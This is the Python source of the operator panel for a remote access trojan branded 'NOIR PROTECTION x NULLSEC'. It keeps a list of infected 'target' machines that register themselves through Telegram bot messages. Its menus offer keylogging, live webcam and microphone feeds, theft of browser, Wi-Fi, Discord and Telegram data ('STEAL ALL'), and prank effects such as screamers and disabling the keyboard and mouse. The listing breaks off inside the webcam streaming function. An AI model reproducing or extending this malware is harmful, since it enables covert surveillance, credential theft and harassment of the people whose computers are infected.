import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import requests
import io
import json
import os
import sys
import time
import threading
from PIL import Image, ImageTk

CONFIG_FILE = os.path.join(os.environ.get('APPDATA', '.'), 'NOIR', 'config.json')
DEVICES_FILE = os.path.join(os.environ.get('APPDATA', '.'), 'NOIR', 'devices.json')
TG_CONFIG_FILE = os.path.join(os.environ.get('APPDATA', '.'), 'NOIR', 'telegram.json')

LANG = {
    'ru': {
        'title': 'NOIR PROTECTION x NULLSEC',
        'target': 'Цель:',
        'connect': 'Подключиться',
        'disconnect': 'Отключиться',
        'save': 'Сохранить',
        'offline': 'ОФФЛАЙН',
        'online': 'ОНЛАЙН',
        'connecting': 'ПОДКЛЮЧЕНИЕ...',
        'no_resp': 'НЕТ ОТВЕТА',
        'stream_err': 'ОШИБКА СТРИМА',
        'saved': 'СОХРАНЕНО',
        'no_ip': 'Введите IP цели',
        'sys': 'Система',
        'monitor': 'Монитор',
        'steal': 'Стилер',
        'info': 'Информация',
        'effects': 'Эффекты',
        'control': 'Контроль',
        'reboot': 'Перезагрузка',
        'shutdown': 'Выключить',
        'lock': 'Заблокировать',
        'unlock': 'Разблокировать',
        'screenshot': 'Скриншот',
        'camera': 'Камера',
        'kl_on': 'Кейлогер ВКЛ',
        'kl_off': 'Кейлогер ВЫКЛ',
        'kl_dump': 'Дамп клавиш',
        'clipboard': 'Буфер обмена',
        'tg': 'Телеграм',
        'browser': 'Браузеры',
        'wifi': 'Wi-Fi',
        'discord': 'Discord',
        'steal_all': 'УКРАСТЬ ВСЁ',
        'sysinfo': 'Инфо системы',
        'processes': 'Процессы',
        'network': 'Сеть',
        'location': 'Локация',
        'software': 'Софт',
        'bam': 'БАМ!',
        'scream': 'Скример',
        'split': 'Разбить экран',
        'restore': 'Восстановить',
        'quake': 'Землетрясение',
        'invert': 'Инверсия',
        'crazy_on': 'Бешеная мышь',
        'cursor': 'Курсор',
        'cd': 'CD',
        'hide_tb': 'Скрыть панель',
        'restore_all': 'Восстановить ВСЁ',
        'mouse_off': 'Мышь ВЫКЛ',
        'mouse_on': 'Мышь ВКЛ',
        'kb_off': 'Клава ВЫКЛ',
        'kb_on': 'Клава ВКЛ',
        'lang_btn': 'EN',
        'devices_title': 'УСТРОЙСТВА',
        'add_device': '+ Добавить',
        'refresh': 'Обновить',
        'no_devices': 'Нет устройств',
        'add_hint': 'Нажмите "+ Добавить" чтобы добавить устройство',
        'enter_ip': 'IP адрес устройства:',
        'enter_name': 'Имя устройства (необязательно):',
        'checking': 'Проверка...',
        'last_seen': 'Последний раз:',
        'never': 'никогда',
        'remove': 'Удалить',
        'webcam': 'Вебкамера',
        'webcam_cap': 'Снимок вебкамеры',
        'live_wcam': 'Вебка LIVE',
        'live_mic': 'Микро LIVE',
        'mic_stop': 'Стоп микро',
        'back': '<< Назад',
        'scanning': 'Сканирование...',
        'dev_online': 'в сети',
        'dev_offline': 'не в сети',
        'port': 'Порт:',
        'sync_tg': 'Синхронизация',
        'tg_settings': 'Telegram',
        'tg_token': 'Bot Token:',
        'tg_chat': 'Chat ID:',
        'syncing': 'Синхронизация...',
        'synced': 'Найдено: ',
        'sync_err': 'Ошибка синхронизации',
        'tg_not_configured': 'Настройте Telegram (кнопка "Telegram")',
    },
    'en': {
        'title': 'NOIR PROTECTION x NULLSEC',
        'target': 'Target:',
        'connect': 'Connect',
        'disconnect': 'Disconnect',
        'save': 'Save',
        'offline': 'OFFLINE',
        'online': 'ONLINE',
        'connecting': 'CONNECTING...',
        'no_resp': 'NO RESPONSE',
        'stream_err': 'STREAM ERROR',
        'saved': 'SAVED',
        'no_ip': 'Enter target IP',
        'sys': 'System',
        'monitor': 'Monitor',
        'steal': 'Steal',
        'info': 'Info',
        'effects': 'Effects',
        'control': 'Control',
        'reboot': 'Reboot',
        'shutdown': 'Shutdown',
        'lock': 'Lock',
        'unlock': 'Unlock',
        'screenshot': 'Screenshot',
        'camera': 'Camera',
        'kl_on': 'Keylog ON',
        'kl_off': 'Keylog OFF',
        'kl_dump': 'Keylog Dump',
        'clipboard': 'Clipboard',
        'tg': 'Telegram',
        'browser': 'Browsers',
        'wifi': 'Wi-Fi',
        'discord': 'Discord',
        'steal_all': 'STEAL ALL',
        'sysinfo': 'Sysinfo',
        'processes': 'Processes',
        'network': 'Network',
        'location': 'Location',
        'software': 'Software',
        'bam': 'BAM!',
        'scream': 'Screamer',
        'split': 'Split Screen',
        'restore': 'Restore',
        'quake': 'Earthquake',
        'invert': 'Invert',
        'crazy_on': 'Crazy Mouse',
        'cursor': 'Cursor',
        'cd': 'CD',
        'hide_tb': 'Hide Taskbar',
        'restore_all': 'Restore ALL',
        'mouse_off': 'Mouse OFF',
        'mouse_on': 'Mouse ON',
        'kb_off': 'KB OFF',
        'kb_on': 'KB ON',
        'lang_btn': 'RU',
        'devices_title': 'DEVICES',
        'add_device': '+ Add Device',
        'refresh': 'Refresh',
        'no_devices': 'No devices',
        'add_hint': 'Click "+ Add Device" to add one',
        'enter_ip': 'Device IP address:',
        'enter_name': 'Device name (optional):',
        'checking': 'Checking...',
        'last_seen': 'Last seen:',
        'never': 'never',
        'remove': 'Remove',
        'webcam': 'Webcam',
        'webcam_cap': 'Webcam capture',
        'live_wcam': 'Webcam LIVE',
        'live_mic': 'Mic LIVE',
        'mic_stop': 'Stop Mic',
        'back': '<< Back',
        'scanning': 'Scanning...',
        'dev_online': 'online',
        'dev_offline': 'offline',
        'port': 'Port:',
        'sync_tg': 'Sync',
        'tg_settings': 'Telegram',
        'tg_token': 'Bot Token:',
        'tg_chat': 'Chat ID:',
        'syncing': 'Syncing...',
        'synced': 'Found: ',
        'sync_err': 'Sync error',
        'tg_not_configured': 'Configure Telegram first (click "Telegram")',
    }
}


class RemoteClient:
    def __init__(self):
        self.running = True
        self.connected = False
        self.ip = ''
        self.stream_url = None
        self.control_url = None
        self.current_image = None
        self._last_mouse_send = 0
        self._mouse_throttle = 0.05
        self.lang = 'ru'
        self.devices = []
        self.device_status = {}
        self._webcam_win = None
        self._wcam_stream_win = None
        self._mic_active = False
        self.wcam_url = None
        self.mic_url = None
        self.tg_token = ''
        self.tg_chat = ''

        self.load_config()
        self.load_devices()
        self.load_tg_config()

        self.root = tk.Tk()
        self.root.title("NOIR PROTECTION x NULLSEC")
        self.root.geometry("1400x920")
        self.root.minsize(1000, 700)
        self.root.configure(bg='#0a0a0a')
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        self.setup_styles()
        self.show_device_screen()

        self.root.mainloop()

    def L(self, key):
        return LANG[self.lang].get(key, key)

    def setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TButton', background='#1a1a1a', foreground='#aa0000',
                        borderwidth=1, padding=6, font=('Consolas', 9, 'bold'))
        style.map('TButton',
                  background=[('active', '#2a0000')],
                  foreground=[('active', '#ff0000')])
        style.configure('Red.TButton', background='#2a0000', foreground='#ff3333',
                        borderwidth=1, padding=6, font=('Consolas', 10, 'bold'))
        style.map('Red.TButton',
                  background=[('active', '#440000')],
                  foreground=[('active', '#ff5555')])
        style.configure('Green.TButton', background='#002a00', foreground='#33ff33',
                        borderwidth=1, padding=6, font=('Consolas', 9, 'bold'))
        style.map('Green.TButton',
                  background=[('active', '#004400')],
                  foreground=[('active', '#55ff55')])
        style.configure('TLabel', background='#0a0a0a', foreground='#666666')
        style.configure('TEntry', fieldbackground='#111111', foreground='#cc0000')

    # ──────────────────────────────────────────────
    #  DEVICE DATABASE
    # ──────────────────────────────────────────────

    def load_devices(self):
        try:
            with open(DEVICES_FILE, 'r') as f:
                self.devices = json.load(f)
        except:
            self.devices = []

    def save_devices(self):
        try:
            os.makedirs(os.path.dirname(DEVICES_FILE), exist_ok=True)
            with open(DEVICES_FILE, 'w') as f:
                json.dump(self.devices, f, indent=2)
        except:
            pass

    def add_device(self, ip, name='', port=8081):
        for d in self.devices:
            if d['ip'] == ip and d.get('port', 8081) == port:
                if name:
                    d['name'] = name
                self.save_devices()
                return
        self.devices.append({
            'ip': ip,
            'name': name or ip,
            'port': port,
            'stream_port': port - 1,
            'last_seen': '',
            'hwid': '',
            'os_info': '',
        })
        self.save_devices()

    def remove_device(self, ip, port=8081):
        self.devices = [d for d in self.devices if not (d['ip'] == ip and d.get('port', 8081) == port)]
        self.save_devices()

    def ping_device(self, device):
        ip = device['ip']
        port = device.get('port', 8081)
        key = f"{ip}:{port}"
        try:
            r = requests.get(f'http://{ip}:{port}/', timeout=2)
            if r.status_code == 200:
                device['last_seen'] = time.strftime('%Y-%m-%d %H:%M')
                self.device_status[key] = True
                self.save_devices()
                return True
        except:
            pass
        # Fallback: device online if last #NOIR_REG received within 15 min
        last_seen = device.get('last_seen', '')
        if last_seen:
            try:
                ls_time = time.mktime(time.strptime(last_seen, '%Y-%m-%d %H:%M'))
                if time.time() - ls_time < 900:
                    self.device_status[key] = True
                    return True
            except:
                pass
        self.device_status[key] = False
        return False

    def ping_all_devices(self):
        threads = []
        for d in self.devices:
            t = threading.Thread(target=self.ping_device, args=(d,), daemon=True)
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=3)
        self.root.after(0, self.refresh_device_list)

    # ──────────────────────────────────────────────
    #  TELEGRAM SYNC
    # ──────────────────────────────────────────────

    def load_tg_config(self):
        try:
            with open(TG_CONFIG_FILE, 'r') as f:
                d = json.load(f)
                self.tg_token = d.get('token', '')
                self.tg_chat = d.get('chat_id', '')
        except:
            pass

    def save_tg_config(self):
        try:
            os.makedirs(os.path.dirname(TG_CONFIG_FILE), exist_ok=True)
            with open(TG_CONFIG_FILE, 'w') as f:
                json.dump({'token': self.tg_token, 'chat_id': self.tg_chat}, f)
        except:
            pass

    def sync_from_telegram(self):
        if not self.tg_token or not self.tg_chat:
            return 0
        try:
            url = f'https://api.telegram.org/bot{self.tg_token}/getUpdates'
            # Fetch last 200 updates in two batches (max 100 per call)
            all_updates = []
            for off in (-200, -100):
                try:
                    r = requests.get(url, params={'limit': 100, 'offset': off}, timeout=10)
                    d = r.json()
                    if d.get('ok'):
                        all_updates.extend(d.get('result', []))
                except:
                    pass
            if not all_updates:
                return -1
            # Deduplicate updates by update_id, keep newest order (highest id first)
            seen_ids = set()
            unique_updates = []
            for upd in sorted(all_updates, key=lambda u: u.get('update_id', 0), reverse=True):
                uid = upd.get('update_id')
                if uid not in seen_ids:
                    seen_ids.add(uid)
                    unique_updates.append(upd)
            count = 0
            seen = set()  # keyed by hwid if available, else ip
            for upd in unique_updates:
                msg = upd.get('message', {})
                text = msg.get('text', '')
                if '#NOIR_REG' not in text:
                    continue
                info = {}
                for line in text.split('\n'):
                    if '=' in line:
                        k, v = line.split('=', 1)
                        info[k.strip()] = v.strip()
                ip = info.get('ip', '')
                hwid = info.get('hwid', '')
                # Deduplicate by HWID (handles VPN users with changing IPs)
                dedup_key = hwid if hwid else ip
                if not ip or dedup_key in seen:
                    continue
                seen.add(dedup_key)
                port = int(info.get('port', 8081))
                stream = int(info.get('stream', port - 1))
                wcam = int(info.get('wcam', 8082))
                mic = int(info.get('mic', 8083))
                name = info.get('name', '') or ip
                os_info = info.get('os', '')
                # Use message date as last_seen so NAT/VPN devices show as online
                msg_date = msg.get('date', 0)
                last_seen_str = (time.strftime('%Y-%m-%d %H:%M', time.localtime(msg_date))
                                 if msg_date else time.strftime('%Y-%m-%d %H:%M'))
                found = False
                # Match by HWID first so IP changes (VPN) update existing entry
                if hwid:
                    for d in self.devices:
                        if d.get('hwid') == hwid:
                            d['ip'] = ip
                            d['port'] = port
                            d['name'] = name
                            d['os_info'] = os_info
                            d['stream_port'] = stream
                            d['wcam_port'] = wcam
                            d['mic_port'] = mic
                            d['last_seen'] = last_seen_str
                            found = True
                            break
                # Fallback: match by IP
                if not found:
                    for d in self.devices:
                        if d['ip'] == ip and d.get('port', 8081) == port:
                            d['hwid'] = hwid
                            d['name'] = name
                            d['os_info'] = os_info
                            d['stream_port'] = stream
                            d['wcam_port'] = wcam
                            d['mic_port'] = mic
                            d['last_seen'] = last_seen_str
                            found = True
                            break
                if not found:
                    self.devices.append({
                        'ip': ip, 'name': name, 'port': port,
                        'stream_port': stream, 'wcam_port': wcam,
                        'mic_port': mic, 'last_seen': last_seen_str,
                        'hwid': hwid, 'os_info': os_info,
                    })
                    count += 1
                # Mark online immediately if #NOIR_REG is recent (within 1 hour)
                if msg_date and (time.time() - msg_date) < 3600:
                    self.device_status[f"{ip}:{port}"] = True
            self.save_devices()
            return count
        except:
            return -1

    # ──────────────────────────────────────────────
    #  DEVICE SELECTION SCREEN
    # ──────────────────────────────────────────────

    def clear_root(self):
        for w in self.root.winfo_children():
            w.destroy()

    def show_device_screen(self):
        self.clear_root()
        self.connected = False
        self.root.title("NOIR PROTECTION x NULLSEC")

        # === TOP BAR ===
        top = tk.Frame(self.root, bg='#0d0000', height=60, highlightbackground='#330000',
                       highlightthickness=1)
        top.pack(fill=tk.X)

        logo_frame = tk.Frame(top, bg='#0d0000')
        logo_frame.pack(side=tk.LEFT, padx=16, pady=10)
        tk.Label(logo_frame, text="NOIR", fg='#cc0000', bg='#0d0000',
                 font=('Arial Black', 18, 'bold')).pack(side=tk.LEFT)
        tk.Label(logo_frame, text="  REMOTE ", fg='#661111', bg='#0d0000',
                 font=('Consolas', 11)).pack(side=tk.LEFT)
        tk.Label(logo_frame, text="CONTROL", fg='#661111', bg='#0d0000',
                 font=('Consolas', 11, 'bold')).pack(side=tk.LEFT)

        right_frame = tk.Frame(top, bg='#0d0000')
        right_frame.pack(side=tk.RIGHT, padx=16)
        ttk.Button(right_frame, text=self.L('lang_btn'),
                   command=self._toggle_lang_devices).pack(side=tk.RIGHT, padx=6)

        # === TOOLBAR ===
        toolbar = tk.Frame(self.root, bg='#0a0a0a')
        toolbar.pack(fill=tk.X, padx=20, pady=(12, 0))

        tk.Label(toolbar, text=self.L('devices_title'), fg='#cc0000', bg='#0a0a0a',
                 font=('Arial Black', 14, 'bold')).pack(side=tk.LEFT)

        self.scan_lbl = tk.Label(toolbar, text='', fg='#666600', bg='#0a0a0a',
                                 font=('Consolas', 9))
        self.scan_lbl.pack(side=tk.LEFT, padx=16)

        btn_frame = tk.Frame(toolbar, bg='#0a0a0a')
        btn_frame.pack(side=tk.RIGHT)

        ttk.Button(btn_frame, text=self.L('refresh'),
                   command=self._refresh_click, style='TButton').pack(side=tk.RIGHT, padx=4)
        ttk.Button(btn_frame, text=self.L('sync_tg'),
                   command=self._sync_click, style='Red.TButton').pack(side=tk.RIGHT, padx=4)
        ttk.Button(btn_frame, text=self.L('tg_settings'),
                   command=self._tg_settings_dialog, style='TButton').pack(side=tk.RIGHT, padx=4)
        ttk.Button(btn_frame, text=self.L('add_device'),
                   command=self._add_device_dialog, style='Green.TButton').pack(side=tk.RIGHT, padx=4)

        # === SEPARATOR ===
        tk.Frame(self.root, bg='#220000', height=1).pack(fill=tk.X, padx=20, pady=(10, 0))

        # === DEVICE LIST CONTAINER ===
        container = tk.Frame(self.root, bg='#0a0a0a')
        container.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        canvas = tk.Canvas(container, bg='#0a0a0a', highlightthickness=0, bd=0)
        scrollbar = tk.Scrollbar(container, orient=tk.VERTICAL, command=canvas.yview,
                                  bg='#1a1a1a', troughcolor='#0a0a0a')
        self.dev_list_frame = tk.Frame(canvas, bg='#0a0a0a')

        self.dev_list_frame.bind('<Configure>',
                                 lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0, 0), window=self.dev_list_frame, anchor=tk.NW,
                             tags='frame')
        canvas.configure(yscrollcommand=scrollbar.set)

        def on_canvas_configure(event):
            canvas.itemconfig('frame', width=event.width)
        canvas.bind('<Configure>', on_canvas_configure)

        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        canvas.bind_all('<MouseWheel>',
                        lambda e: canvas.yview_scroll(int(-1 * (e.delta / 120)), 'units'))

        self.refresh_device_list()

        if self.tg_token and self.tg_chat:
            threading.Thread(target=self._auto_sync_and_ping, daemon=True).start()
        else:
            threading.Thread(target=self.ping_all_devices, daemon=True).start()

    def refresh_device_list(self):
        for w in self.dev_list_frame.winfo_children():
            w.destroy()

        if not self.devices:
            empty = tk.Frame(self.dev_list_frame, bg='#0a0a0a')
            empty.pack(fill=tk.BOTH, expand=True, pady=80)
            tk.Label(empty, text=self.L('no_devices'), fg='#333333', bg='#0a0a0a',
                     font=('Arial Black', 16)).pack()
            tk.Label(empty, text=self.L('add_hint'), fg='#222222', bg='#0a0a0a',
                     font=('Consolas', 10)).pack(pady=8)
            return

        for i, dev in enumerate(self.devices):
            self._build_device_card(dev, i)

    def _build_device_card(self, dev, idx):
        ip = dev['ip']
        port = dev.get('port', 8081)
        key = f"{ip}:{port}"
        is_online = self.device_status.get(key, False)
        name = dev.get('name', ip)
        last = dev.get('last_seen', '') or self.L('never')

        card = tk.Frame(self.dev_list_frame, bg='#111111',
                        highlightbackground='#003300' if is_online else '#1a0000',
                        highlightthickness=2, cursor='hand2')
        card.pack(fill=tk.X, pady=4, ipady=8)

        # Status indicator column
        status_frame = tk.Frame(card, bg='#111111', width=60)
        status_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(12, 0))
        status_frame.pack_propagate(False)

        dot_color = '#00cc00' if is_online else '#cc0000'
        dot_text = '⬤'
        tk.Label(status_frame, text=dot_text, fg=dot_color, bg='#111111',
                 font=('Segoe UI', 20)).pack(expand=True)

        # Info column
        info_frame = tk.Frame(card, bg='#111111')
        info_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=12, pady=6)

        # Row 1: name + status text
        row1 = tk.Frame(info_frame, bg='#111111')
        row1.pack(fill=tk.X)
        tk.Label(row1, text=name, fg='#dddddd', bg='#111111',
                 font=('Consolas', 13, 'bold')).pack(side=tk.LEFT)
        status_text = self.L('dev_online') if is_online else self.L('dev_offline')
        status_color = '#00cc00' if is_online else '#660000'
        tk.Label(row1, text=f"  [{status_text}]", fg=status_color, bg='#111111',
                 font=('Consolas', 9)).pack(side=tk.LEFT, padx=8)

        # Row 2: IP + port
        row2 = tk.Frame(info_frame, bg='#111111')
        row2.pack(fill=tk.X, pady=(2, 0))
        tk.Label(row2, text=f"IP: {ip}", fg='#888888', bg='#111111',
                 font=('Consolas', 10)).pack(side=tk.LEFT)
        tk.Label(row2, text=f"   {self.L('port')} {port}", fg='#555555', bg='#111111',
                 font=('Consolas', 9)).pack(side=tk.LEFT)

        # Row 3: HWID + last seen
        row3 = tk.Frame(info_frame, bg='#111111')
        row3.pack(fill=tk.X, pady=(2, 0))
        hwid = dev.get('hwid', '')
        if hwid:
            tk.Label(row3, text=f"HWID: {hwid}", fg='#555555', bg='#111111',
                     font=('Consolas', 9)).pack(side=tk.LEFT)
        tk.Label(row3, text=f"   {self.L('last_seen')} {last}", fg='#444444', bg='#111111',
                 font=('Consolas', 9)).pack(side=tk.LEFT)

        os_info = dev.get('os_info', '')
        if os_info:
            tk.Label(row3, text=f"   {os_info}", fg='#444444', bg='#111111',
                     font=('Consolas', 9)).pack(side=tk.LEFT)

        # Buttons column
        btn_frame = tk.Frame(card, bg='#111111')
        btn_frame.pack(side=tk.RIGHT, padx=12, pady=6)

        ttk.Button(btn_frame, text=self.L('connect'),
                   command=lambda d=dev: self._connect_device(d),
                   style='Green.TButton').pack(pady=2)
        ttk.Button(btn_frame, text=self.L('webcam'),
                   command=lambda d=dev: self._webcam_device(d),
                   style='TButton').pack(pady=2)
        ttk.Button(btn_frame, text=self.L('remove'),
                   command=lambda d=dev: self._remove_device(d),
                   style='Red.TButton').pack(pady=2)

        card.bind('<Double-Button-1>', lambda e, d=dev: self._connect_device(d))
        for child in info_frame.winfo_children():
            child.bind('<Double-Button-1>', lambda e, d=dev: self._connect_device(d))
            for sub in child.winfo_children():
                sub.bind('<Double-Button-1>', lambda e, d=dev: self._connect_device(d))

    def _toggle_lang_devices(self):
        self.lang = 'en' if self.lang == 'ru' else 'ru'
        self.show_device_screen()

    def _refresh_click(self):
        self.scan_lbl.config(text=self.L('scanning'), fg='#666600')
        threading.Thread(target=self._do_refresh, daemon=True).start()

    def _do_refresh(self):
        self.ping_all_devices()
        self.root.after(0, lambda: self.scan_lbl.config(text=''))

    def _sync_click(self):
        if not self.tg_token or not self.tg_chat:
            messagebox.showwarning("NOIR", self.L('tg_not_configured'))
            return
        self.scan_lbl.config(text=self.L('syncing'), fg='#666600')
        threading.Thread(target=self._do_sync, daemon=True).start()

    def _do_sync(self):
        count = self.sync_from_telegram()
        if count >= 0:
            self.root.after(0, lambda: self.scan_lbl.config(
                text=f"{self.L('synced')}{count}", fg='#00cc00'))
            self.ping_all_devices()
        else:
            self.root.after(0, lambda: self.scan_lbl.config(
                text=self.L('sync_err'), fg='#cc0000'))

    def _auto_sync_and_ping(self):
        self.root.after(0, lambda: self.scan_lbl.config(
            text=self.L('syncing'), fg='#666600'))
        count = self.sync_from_telegram()
        if count > 0:
            self.root.after(0, lambda: self.scan_lbl.config(
                text=f"{self.L('synced')}{count}", fg='#00cc00'))
        else:
            self.root.after(0, lambda: self.scan_lbl.config(text=''))
        self.ping_all_devices()

    def _tg_settings_dialog(self):
        dlg = tk.Toplevel(self.root)
        dlg.title("NOIR  —  Telegram")
        dlg.geometry("460x220")
        dlg.configure(bg='#0d0000')
        dlg.resizable(False, False)
        dlg.transient(self.root)
        dlg.grab_set()

        tk.Label(dlg, text="Telegram", fg='#cc0000', bg='#0d0000',
                 font=('Arial Black', 14, 'bold')).pack(pady=(16, 12))

        def _tg_entry(parent, var, **kw):
            e = tk.Entry(parent, textvariable=var, bg='#111111', fg='#cc0000',
                         insertbackground='#cc0000', font=('Consolas', 10),
                         relief=tk.FLAT, highlightbackground='#330000',
                         highlightthickness=1, **kw)

            def _paste(widget=e):
                try:
                    text = widget.clipboard_get()
                    try:
                        widget.delete(tk.SEL_FIRST, tk.SEL_LAST)
                    except tk.TclError:
                        pass
                    widget.insert(tk.INSERT, text)
                except tk.TclError:
                    pass
                return 'break'

            e.bind('<Control-v>', lambda ev: _paste())
            e.bind('<Control-V>', lambda ev: _paste())
            e.bind('<Control-a>', lambda ev: (e.select_range(0, tk.END), 'break'))
            e.bind('<Control-A>', lambda ev: (e.select_range(0, tk.END), 'break'))

            menu = tk.Menu(e, tearoff=0, bg='#1a1a1a', fg='#cc0000',
                           activebackground='#2a0000', activeforeground='#ff4444')
            menu.add_command(label='Вставить  Ctrl+V', command=_paste)
            menu.add_separator()
            menu.add_command(label='Выделить всё  Ctrl+A',
                             command=lambda: e.select_range(0, tk.END))
            e.bind('<Button-3>', lambda ev: menu.tk_popup(ev.x_root, ev.y_root))
            return e

        f1 = tk.Frame(dlg, bg='#0d0000')
        f1.pack(fill=tk.X, padx=24, pady=4)
        tk.Label(f1, text=self.L('tg_token'), fg='#888888', bg='#0d0000',
                 font=('Consolas', 10)).pack(anchor=tk.W)
        token_var = tk.StringVar(value=self.tg_token)
        token_entry = _tg_entry(f1, token_var, width=50, show='*')
        token_entry.pack(fill=tk.X, pady=2)

        f2 = tk.Frame(dlg, bg='#0d0000')
        f2.pack(fill=tk.X, padx=24, pady=4)
        tk.Label(f2, text=self.L('tg_chat'), fg='#888888', bg='#0d0000',
                 font=('Consolas', 10)).pack(anchor=tk.W)
        chat_var = tk.StringVar(value=self.tg_chat)
        _tg_entry(f2, chat_var, width=20).pack(fill=tk.X, pady=2)

        def do_save():
            self.tg_token = token_var.get().strip()
            self.tg_chat = chat_var.get().strip()
            self.save_tg_config()
            dlg.destroy()

        btn_f = tk.Frame(dlg, bg='#0d0000')
        btn_f.pack(pady=12)
        ttk.Button(btn_f, text=self.L('save'), command=do_save,
                   style='Green.TButton').pack(side=tk.LEFT, padx=6)
        ttk.Button(btn_f, text="Cancel", command=dlg.destroy,
                   style='TButton').pack(side=tk.LEFT, padx=6)
        dlg.after(50, token_entry.focus_force)

    def _add_device_dialog(self):
        dlg = tk.Toplevel(self.root)
        dlg.title("NOIR  —  " + self.L('add_device'))
        dlg.geometry("400x280")
        dlg.configure(bg='#0d0000')
        dlg.resizable(False, False)
        dlg.transient(self.root)
        dlg.grab_set()

        tk.Label(dlg, text=self.L('add_device'), fg='#cc0000', bg='#0d0000',
                 font=('Arial Black', 14, 'bold')).pack(pady=(16, 12))

        def _make_entry(parent, var, fg='#cc0000', **kw):
            e = tk.Entry(parent, textvariable=var, bg='#111111', fg=fg,
                         insertbackground=fg, font=('Consolas', 12), relief=tk.FLAT,
                         highlightbackground='#330000', highlightthickness=1, **kw)

            def _do_paste(widget=e):
                try:
                    text = widget.clipboard_get()
                    try:
                        widget.delete(tk.SEL_FIRST, tk.SEL_LAST)
                    except tk.TclError:
                        pass
                    widget.insert(tk.INSERT, text)
                except tk.TclError:
                    pass
                return 'break'

            def _do_copy(widget=e):
                try:
                    text = widget.selection_get()
                    widget.clipboard_clear()
                    widget.clipboard_append(text)
                except tk.TclError:
                    pass
                return 'break'

            def _do_cut(widget=e):
                _do_copy(widget)
                try:
                    widget.delete(tk.SEL_FIRST, tk.SEL_LAST)
                except tk.TclError:
                    pass
                return 'break'

            e.bind('<Control-v>', lambda ev: _do_paste())
            e.bind('<Control-V>', lambda ev: _do_paste())
            e.bind('<Control-c>', lambda ev: _do_copy())
            e.bind('<Control-C>', lambda ev: _do_copy())
            e.bind('<Control-x>', lambda ev: _do_cut())
            e.bind('<Control-X>', lambda ev: _do_cut())
            e.bind('<Control-a>', lambda ev: (e.select_range(0, tk.END), 'break'))
            e.bind('<Control-A>', lambda ev: (e.select_range(0, tk.END), 'break'))

            menu = tk.Menu(e, tearoff=0, bg='#1a1a1a', fg='#cc0000',
                           activebackground='#2a0000', activeforeground='#ff4444')
            menu.add_command(label='Вставить  Ctrl+V', command=_do_paste)
            menu.add_command(label='Копировать  Ctrl+C', command=_do_copy)
            menu.add_command(label='Вырезать  Ctrl+X', command=_do_cut)
            menu.add_separator()
            menu.add_command(label='Выделить всё  Ctrl+A',
                             command=lambda: e.select_range(0, tk.END))
            e.bind('<Button-3>', lambda ev: menu.tk_popup(ev.x_root, ev.y_root))
            return e

        # IP
        f1 = tk.Frame(dlg, bg='#0d0000')
        f1.pack(fill=tk.X, padx=24, pady=4)
        tk.Label(f1, text=self.L('enter_ip'), fg='#888888', bg='#0d0000',
                 font=('Consolas', 10)).pack(anchor=tk.W)
        ip_var = tk.StringVar()
        ip_entry = _make_entry(f1, ip_var, width=30)
        ip_entry.pack(fill=tk.X, pady=2)

        # Name
        f2 = tk.Frame(dlg, bg='#0d0000')
        f2.pack(fill=tk.X, padx=24, pady=4)
        tk.Label(f2, text=self.L('enter_name'), fg='#888888', bg='#0d0000',
                 font=('Consolas', 10)).pack(anchor=tk.W)
        name_var = tk.StringVar()
        _make_entry(f2, name_var, fg='#cccccc', width=30).pack(fill=tk.X, pady=2)

        # Port
        f3 = tk.Frame(dlg, bg='#0d0000')
        f3.pack(fill=tk.X, padx=24, pady=4)
        tk.Label(f3, text=self.L('port'), fg='#888888', bg='#0d0000',
                 font=('Consolas', 10)).pack(side=tk.LEFT)
        port_var = tk.StringVar(value='8081')
        _make_entry(f3, port_var, width=6).pack(side=tk.LEFT, padx=8)

        def do_add():
            ip = ip_var.get().strip()
            if not ip:
                return
            name = name_var.get().strip()
            try:
                port = int(port_var.get().strip())
            except:
                port = 8081
            self.add_device(ip, name, port)
            dlg.destroy()
            self.show_device_screen()

        btn_f = tk.Frame(dlg, bg='#0d0000')
        btn_f.pack(pady=12)
        ttk.Button(btn_f, text=self.L('save'), command=do_add,
                   style='Green.TButton').pack(side=tk.LEFT, padx=6)
        ttk.Button(btn_f, text="Cancel", command=dlg.destroy,
                   style='TButton').pack(side=tk.LEFT, padx=6)

        dlg.bind('<Return>', lambda e: do_add())
        dlg.after(50, ip_entry.focus_force)

    def _remove_device(self, dev):
        self.remove_device(dev['ip'], dev.get('port', 8081))
        self.show_device_screen()

    def _connect_device(self, dev):
        ip = dev['ip']
        port = dev.get('port', 8081)
        self.ip = ip
        self.stream_url = f'http://{ip}:{dev.get("stream_port", port - 1)}/stream'
        self.control_url = f'http://{ip}:{port}/'
        self.wcam_url = f'http://{ip}:{dev.get("wcam_port", 8082)}/stream'
        self.mic_url = f'http://{ip}:{dev.get("mic_port", 8083)}/'
        self.save_config()
        self.show_remote_screen(dev)

    def _webcam_device(self, dev):
        ip = dev['ip']
        wcam_port = dev.get('wcam_port', 8082)
        wcam_url = f'http://{ip}:{wcam_port}/stream'

        if self._webcam_win and self._webcam_win.winfo_exists():
            self._webcam_win.destroy()

        win = tk.Toplevel(self.root)
        win.title(f"NOIR Webcam LIVE  —  {dev.get('name', ip)}")
        win.geometry("680x520")
        win.configure(bg='#050000')
        win.resizable(True, True)
        self._webcam_win = win

        tk.Label(win, text=self.L('live_wcam'), fg='#cc0000', bg='#050000',
                 font=('Consolas', 12, 'bold')).pack(pady=6)

        cam_canvas = tk.Canvas(win, bg='#050000', highlightthickness=0)
        cam_canvas.pack(fill=tk.BOTH, expand=True, padx=8, pady=4)
        cam_img_id = cam_canvas.create_image(0, 0, anchor=tk.NW)

        status = tk.Label(win, text=self.L('connecting'), fg='#cccc00', bg='#050000',
                          font=('Consolas', 9))
        status.pack(pady=2)

        btn_f = tk.Frame(win, bg='#050000')
        btn_f.pack(pady=4)
        ttk.Button(btn_f, text="Close", command=win.destroy,
                   style='TButton').pack()

        running = [True]

        def on_close():
            running[0] = False
            self._webcam_win = None
            win.destroy()
        win.protocol("WM_DELETE_WINDOW", on_close)

        def wcam_loop():
            try:
                r = requests.get(wcam_url, stream=True, timeout=6)
                buf = b''
                try:
